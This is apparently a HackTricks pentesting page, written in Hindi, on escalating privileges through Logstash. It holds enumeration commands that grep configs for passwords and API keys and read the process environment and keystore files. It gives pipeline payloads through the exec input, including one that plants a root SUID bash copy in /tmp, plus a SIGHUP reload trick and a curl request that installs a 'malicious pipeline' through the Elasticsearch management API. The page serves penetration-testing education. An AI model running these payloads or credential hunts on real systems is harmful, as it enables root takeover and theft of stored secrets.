# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash का उपयोग **pipelines** नामक सिस्टम के ज़रिए **logs इकट्ठा करने, बदलने और भेजने** के लिए किया जाता है। ये pipelines **input**, **filter** और **output** stages से बने होते हैं।<sup>[[4]](#references)</sup> जब Logstash किसी compromised machine पर चलता है, तो एक दिलचस्प पहलू सामने आता है।

### Pipeline Configuration

Debian और RPM package installs पर, pipelines को **/etc/logstash/pipelines.yml** के ज़रिए configure किया जाता है, जिसमें pipeline configurations की locations की सूची होती है; अन्य distributions में `pipelines.yml` को Logstash की `path.settings` directory में रखा जाता है।<sup>[[5]](#references)[[6]](#references)</sup>

```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
  path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
  path.config: "/usr/share/logstash/pipeline/1*.conf"
  pipeline.workers: 6
```

यह फ़ाइल बताती है कि pipeline configurations वाली **.conf** फ़ाइलें कहाँ मौजूद हैं। **Elasticsearch output** का उपयोग करते समय, इसकी `user`/`password`, `cloud_auth` या `api_key` settings जाँचें; account के effective privileges Elasticsearch पर निर्भर करते हैं। `path.config` glob उस pipeline के लिए मेल खाने वाली सभी फ़ाइलें लोड करता है।<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

यदि Logstash को `pipelines.yml` के बजाय `-f <directory>` के साथ शुरू किया जाता है, तो `-f` को प्राथमिकता मिलती है और **उस directory की सभी फ़ाइलें lexicographical order में जोड़कर एक single config के रूप में parse की जाती हैं**।<sup>[[6]](#references)[[7]](#references)</sup> इससे 2 offensive implications पैदा होते हैं:

- `000-input.conf` या `zzz-output.conf` जैसी डाली गई फ़ाइल final pipeline के assemble होने के तरीके को बदल सकती है
- कोई malformed फ़ाइल combined config का validation fail करा सकती है; reload के दौरान Logstash पिछली pipeline को बनाए रखता है, इसलिए auto-reload पर निर्भर होने से पहले payloads validate करें।<sup>[[1]](#references)</sup>

### Compromised Host पर Fast Enumeration

जिस मशीन पर Logstash installed है, वहाँ जल्दी से जाँचें:

```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```

यह भी जाँचें कि local monitoring API पहुँच योग्य है या नहीं। डिफ़ॉल्ट रूप से यह **127.0.0.1:9600** पर bind होता है, जो आमतौर पर host पर पहुँचने के बाद पर्याप्त होता है।<sup>[[8]](#references)</sup>

```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```

ये endpoints pipeline IDs और settings, runtime metrics, तथा config-reload success/failure counters दिखाते हैं, जिससे यह पुष्टि करने में मदद मिलती है कि बदलाव स्वीकार किया गया था या नहीं।<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

यदि मिली हुई credential **Elasticsearch** को target करती है, तो [Elasticsearch के बारे में यह अन्य पेज](../../network-services-pentesting/9200-pentesting-elasticsearch.md) देखें।

### File input से dynamic command output तक डेटा भेजना

वर्तमान user के लिए pipeline configuration read-only हो सकती है, जबकि उसका [file input](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-file) ऐसे path पर नज़र रखता है जहाँ user लिख सकता है। उस input से लेकर किसी भी [Grok field capture](https://www.elastic.co/docs/reference/logstash/plugins/plugins-filters-grok) और फिर [exec output](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-exec) तक loaded pipeline का पता लगाएँ। exec output अपने `command` को shell के ज़रिए चलाता है और `%{field}` values को shell metacharacters को sanitize किए बिना बदलता है। Writable input path, privilege escalation का संकेत तभी है जब चल रही service की identity अधिक privileges वाली हो, user की file वास्तव में watched input में पहुँच सके, filters और output conditions उसकी सामग्री को command field तक route करें, और वह output plugin installed तथा active हो। Directory की search/write permissions, file-input tracking state और प्रभावी service account को अलग-अलग जाँचें; passive enumeration के दौरान कोई test event न लिखें और न ही output invoke करें।

### Writable Pipelines के ज़रिए Privilege Escalation

Privilege escalation का प्रयास करने के लिए, पहले पता लगाएँ कि Logstash service वास्तव में किस user के तहत चल रही है; यह न मानें कि वह root या **logstash** user है। सुनिश्चित करें कि आप इन **में से एक** शर्त पूरी करते हैं:

- किसी pipeline **.conf** file पर **write access** हो **या**
- **/etc/logstash/pipelines.yml** file में wildcard का उपयोग हो और आप target folder में लिख सकें।<sup>[[6]](#references)[[7]](#references)</sup>

इसके अतिरिक्त, इन **में से एक** शर्त पूरी होनी चाहिए:

- Logstash service को restart करने की क्षमता हो **या**
- **/etc/logstash/logstash.yml** file में **config.reload.automatic: true** सेट हो।<sup>[[1]](#references)[[15]](#references)</sup>

Configuration में wildcard होने पर, उससे मेल खाने वाली file बनाने से command execution संभव हो जाता है।<sup>[[7]](#references)[[9]](#references)</sup> उदाहरण के लिए:

```bash
input {
  exec {
    command => "whoami"
    interval => 120
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}
```

यहाँ, **interval** सेकंड में execution frequency निर्धारित करता है। दिए गए उदाहरण में, **whoami** command हर 120 सेकंड में चलता है और इसका output **/tmp/output.log** में भेजा जाता है।<sup>[[9]](#references)</sup>

**/etc/logstash/logstash.yml** में **config.reload.automatic: true** होने पर, Logstash restart किए बिना नई या संशोधित pipeline configurations को अपने आप पहचानकर लागू करेगा।<sup>[[1]](#references)[[15]](#references)</sup> यदि wildcard नहीं है, तब भी मौजूदा configurations में बदलाव किए जा सकते हैं, लेकिन व्यवधानों से बचने के लिए सावधानी बरतने की सलाह दी जाती है।

### अधिक विश्वसनीय Pipeline Payloads

`exec` input plugin मौजूदा releases में भी काम करता है और इसके लिए `interval` या `schedule` में से किसी एक की आवश्यकता होती है। यह Logstash JVM को **fork** करके execute होता है, इसलिए यदि memory कम हो, तो आपका payload चुपचाप चलने के बजाय `ENOMEM` के साथ fail हो सकता है।<sup>[[9]](#references)</sup>

जब service के पास root-owned SUID file बनाने के लिए पर्याप्त privileges हों, तो privilege-escalation के लिए एक व्यावहारिक payload ऐसा है जो एक स्थायी artifact छोड़ता है:

```bash
input {
  exec {
    command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
    interval => 300
  }
}
output {
  null {}
}
```

यदि आपके पास restart करने के अधिकार नहीं हैं, लेकिन आप process को signal भेज सकते हैं, तो Logstash Unix-जैसे सिस्टम पर **SIGHUP** से triggered reload का भी समर्थन करता है:<sup>[[1]](#references)</sup>

```bash
kill -SIGHUP $(pgrep -f logstash)
```

ध्यान रखें कि हर plugin reload-friendly नहीं होता। उदाहरण के लिए, **stdin** input automatic reload को रोकता है, इसलिए यह न मानें कि `config.reload.automatic` हमेशा आपके बदलाव लागू करेगा।<sup>[[1]](#references)</sup>

### Logstash से Secrets चुराना

केवल code execution पर ध्यान देने से पहले, उस data को हासिल करें जिसकी Logstash के पास पहले से पहुँच है:

- Credentials `elasticsearch {}` outputs, `http_poller` URLs/settings, JDBC inputs या cloud-related settings में हो सकते हैं; इन plugins में ऐसे credential fields होते हैं जिन्हें खोजना उपयोगी है।<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Secure settings **`/etc/logstash/logstash.keystore`** या किसी अन्य `path.settings` directory में हो सकती हैं।<sup>[[5]](#references)[[10]](#references)</sup>
- Keystore password **`LOGSTASH_KEYSTORE_PASS`** के ज़रिए दिया जा सकता है, और RPM/DEB installs service environment variables को **`/etc/sysconfig/logstash`** से लोड करते हैं।<sup>[[10]](#references)</sup>
- `${VAR}` के साथ environment-variable expansion, Logstash startup के समय resolve होता है, इसलिए service environment की जाँच करना उपयोगी है।<sup>[[14]](#references)</sup>

काम की जाँचें:

```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```

यह जाँचना भी उचित है, क्योंकि **CVE-2023-46672** से पता चला कि कुछ विशिष्ट परिस्थितियों में Logstash ने संवेदनशील जानकारी अपने लॉग में दर्ज की, जिसमें इसके keystore में रखे गए और configuration में संदर्भित secrets भी शामिल थे; यदि वे परिस्थितियाँ लागू हो सकती हैं, तो पुराने Logstash logs और `journald` entries की समीक्षा करें।<sup>[[3]](#references)</sup>

### केंद्रीकृत Pipeline Management का दुरुपयोग

कुछ वातावरणों में, host पूरी तरह से स्थानीय `.conf` files पर निर्भर **नहीं** होता। यदि **`xpack.management.enabled: true`** configured है, तो Logstash Elasticsearch/Kibana से केंद्रीकृत रूप से managed pipelines प्राप्त कर सकता है, और इस mode को enable करने के बाद स्थानीय pipeline configs ही सत्य का स्रोत नहीं रह जाते।<sup>[[2]](#references)</sup>

इसका अर्थ है कि हमले का रास्ता अलग है:

1. स्थानीय Logstash settings, keystore या logs से Elastic credentials प्राप्त करें।<sup>[[3]](#references)[[10]](#references)</sup>
2. जाँचें कि क्या account के पास **`manage_logstash_pipelines`** cluster privilege है।<sup>[[16]](#references)</sup>
3. एक centrally managed pipeline बनाएँ या बदलें, ताकि Logstash host अगले poll interval पर आपका payload execute करे।<sup>[[2]](#references)[[16]](#references)</sup>

इस feature के लिए इस्तेमाल की जाने वाली Elasticsearch API है:<sup>[[16]](#references)</sup>

```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
  -H 'Content-Type: application/json' \
  -u user:password \
  -d '{
    "description": "malicious pipeline",
    "last_modified": "2026-01-02T02:50:51.250Z",
    "username": "user",
    "pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
    "pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
    "pipeline_settings": {
      "pipeline.workers": 1,
      "pipeline.batch.size": 1,
      "pipeline.batch.delay": 50,
      "queue.type": "memory",
      "queue.max_bytes": "1gb",
      "queue.checkpoint.writes": 1024
    }
  }'
```

यह खास तौर पर तब उपयोगी होता है, जब स्थानीय फ़ाइलें read-only हों, लेकिन Logstash पहले से ही दूरस्थ रूप से pipelines फ़ेच करने के लिए पंजीकृत हो।<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: कॉन्फ़िगरेशन फ़ाइल को फिर से लोड करना](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: केंद्रीकृत Pipeline प्रबंधन कॉन्फ़िगर करना](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1 सुरक्षा अपडेट (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Logstash Pipeline बनाना](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Logstash डायरेक्टरी लेआउट](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: एकाधिक Pipelines](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: कमांड लाइन से Logstash चलाना](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: APIs से Logstash की निगरानी करना](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Exec input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: सुरक्षित सेटिंग्स के लिए Secrets keystore](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Elasticsearch output plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Http_poller input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Jdbc input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: Environment variables का उपयोग करना](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch API: Logstash Pipeline बनाना या अपडेट करना](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash API: Pipelines की सेटिंग्स प्राप्त करना](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash API: Pipelines के आँकड़े प्राप्त करना](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
